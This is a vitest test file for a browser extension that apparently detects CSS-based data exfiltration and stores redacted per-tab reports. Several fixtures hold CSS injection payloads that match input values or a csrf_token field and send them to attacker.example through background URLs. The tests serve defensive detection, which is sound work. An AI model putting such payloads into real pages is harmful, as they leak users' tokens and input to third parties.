import { describe, expect, it } from "vitest";
import { browser } from "wxt/browser";
import { DEFAULT_SITE_POLICY, REPORT_LIMITS, STORAGE_KEYS } from "../../../src/shared/constants";
import { pruneOldReports, saveFrameReport, saveSitePolicy, getTabReport, listReports } from "../../../src/browser/storage/reports";
import { analyzeStylesheet } from "../../../src/core/analyzer/analyzeStylesheet";
import { createPartialFrameSummary } from "../../../src/browser/scanner/coverageSummary";
import { createCrossOriginSubframePartialReport } from "../../../src/browser/scanner/navigationFrameCoverage";
import type { Finding } from "../../../src/shared/types";

describe("report storage and scanner browser integration", () => {
  it("merges frame reports into a tab report", async () => {
    const summary = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" });
    await saveFrameReport(1, "https://app.example/", { frameId: 0, parentFrameId: -1, frameUrl: "https://app.example/", frameOrigin: "https://app.example", summary, updatedAt: Date.now() });
    const report = await getTabReport(1);
    expect(report?.frames).toHaveLength(1);
    expect(report?.summary.findings.length).toBeGreaterThan(0);
  });

  it("deduplicates parent-scan and navigation-event partial coverage for the same frame", async () => {
    const topSummary = {
      ...createPartialFrameSummary("https://app.example.test/inbox", "https://third-party.example.test/mail"),
      analyzedFrames: 1,
      partialFrames: 1,
    };
    const navigationFrame = createCrossOriginSubframePartialReport({
      tabId: 10,
      topLevelUrl: "https://app.example.test/inbox",
      frameId: 2,
      parentFrameId: 0,
      frameUrl: "https://third-party.example.test/mail",
    });
    expect(navigationFrame).not.toBeNull();

    await saveFrameReport(10, "https://app.example.test/inbox", {
      frameId: 0,
      parentFrameId: -1,
      frameUrl: "https://app.example.test/inbox",
      frameOrigin: "https://app.example.test",
      summary: topSummary,
      updatedAt: Date.now(),
    });
    await saveFrameReport(10, "https://app.example.test/inbox", navigationFrame!);

    const report = await getTabReport(10);
    expect(report?.frames).toHaveLength(2);
    expect(report?.summary.partialFrames).toBe(1);
    expect(report?.summary.findings.filter((finding) => finding.reasons.includes("frame.cross_origin.uninspectable"))).toHaveLength(1);

    const listedReport = (await listReports()).find((item) => item.tabId === 10);
    expect(listedReport?.summary.partialFrames).toBe(1);
  });

  it("stores only redacted report URLs and selector values", async () => {
    const secret = "abcd1234abcd1234abcd1234";
    const summary = analyzeStylesheet({
      cssText: `input[name="csrf_token"][value^="${secret}"]{background:url(https://attacker.example/leak?csrf=${secret})}`,
      pageUrl: `https://app.example/account?session=${secret}`,
      sourceKind: "style_element",
      sourceUrl: `https://app.example/account?session=${secret}`
    });
    await saveFrameReport(99, `https://app.example/account?session=${secret}`, {
      frameId: 0,
      parentFrameId: -1,
      frameUrl: `https://app.example/account?session=${secret}`,
      frameOrigin: "https://app.example",
      summary,
      updatedAt: Date.now()
    });
    const report = await getTabReport(99);
    const serialized = JSON.stringify(report);
    expect(serialized).not.toContain(secret);
    expect(serialized).toContain("[redacted]");
    expect(report?.summary.findings[0]?.destinationOrigin).toBe("https://attacker.example");
  });

  it("caps report frames and findings before storage", async () => {
    const summary = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" });
    const noisySummary = { ...summary, findings: Array.from({ length: REPORT_LIMITS.maxFindingsPerFrame + 20 }, () => summary.findings[0] as Finding) };
    for (let frameId = 0; frameId < REPORT_LIMITS.maxFramesPerReport + 5; frameId += 1) {
      await saveFrameReport(44, "https://app.example/", { frameId, parentFrameId: -1, frameUrl: `https://app.example/frame-${frameId}`, frameOrigin: "https://app.example", summary: noisySummary, updatedAt: Date.now() });
    }
    const report = await getTabReport(44);
    expect(report?.frames.length).toBeLessThanOrEqual(REPORT_LIMITS.maxFramesPerReport);
    expect(report?.frames[0]?.summary.findings.length).toBeLessThanOrEqual(REPORT_LIMITS.maxFindingsPerFrame);
    expect(report?.summary.findings.length).toBeLessThanOrEqual(REPORT_LIMITS.maxFindingsPerReport);
  });

  it("prunes stale reports after saving a report and after retention settings change", async () => {
    const now = Date.now();
    await browser.storage.local.set({
      [STORAGE_KEYS.settings]: { ...DEFAULT_SITE_POLICY, logRetentionDays: 1 },
      [`${STORAGE_KEYS.reportsPrefix}old`]: {
        tabId: 77,
        url: "https://old.example/",
        origin: "https://old.example",
        summary: { ...createPartialFrameSummary("https://old.example/", "https://third.example/frame"), findings: [] },
        frames: [],
        updatedAt: now - 3 * 86_400_000,
      },
    });

    const summary = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" });
    await saveFrameReport(78, "https://app.example/", { frameId: 0, parentFrameId: -1, frameUrl: "https://app.example/", frameOrigin: "https://app.example", summary, updatedAt: now });

    const storedAfterSave = await browser.storage.local.get(null);
    expect(storedAfterSave[`${STORAGE_KEYS.reportsPrefix}old`]).toBeUndefined();
    expect(storedAfterSave[`${STORAGE_KEYS.reportsPrefix}78`]).toBeDefined();

    await browser.storage.local.set({
      [`${STORAGE_KEYS.reportsPrefix}recentButTooOldForNewPolicy`]: {
        tabId: 79,
        url: "https://recent.example/",
        origin: "https://recent.example",
        summary: { ...createPartialFrameSummary("https://recent.example/", "https://third.example/frame"), findings: [] },
        frames: [],
        updatedAt: now - 2 * 86_400_000,
      },
    });
    await saveSitePolicy({ ...DEFAULT_SITE_POLICY, logRetentionDays: 1 });

    const storedAfterPolicySave = await browser.storage.local.get(null);
    expect(storedAfterPolicySave[`${STORAGE_KEYS.reportsPrefix}recentButTooOldForNewPolicy`]).toBeUndefined();
  });

  it("prunes stale reports through the explicit pruning entrypoint", async () => {
    await browser.storage.local.set({
      [`${STORAGE_KEYS.reportsPrefix}stale`]: {
        tabId: 80,
        url: "https://stale.example/",
        origin: "https://stale.example",
        summary: { ...createPartialFrameSummary("https://stale.example/", "https://third.example/frame"), findings: [] },
        frames: [],
        updatedAt: Date.now() - 10 * 86_400_000,
      },
    });

    await pruneOldReports({ ...DEFAULT_SITE_POLICY, logRetentionDays: 1 });
    const stored = await browser.storage.local.get(null);
    expect(stored[`${STORAGE_KEYS.reportsPrefix}stale`]).toBeUndefined();
  });

});
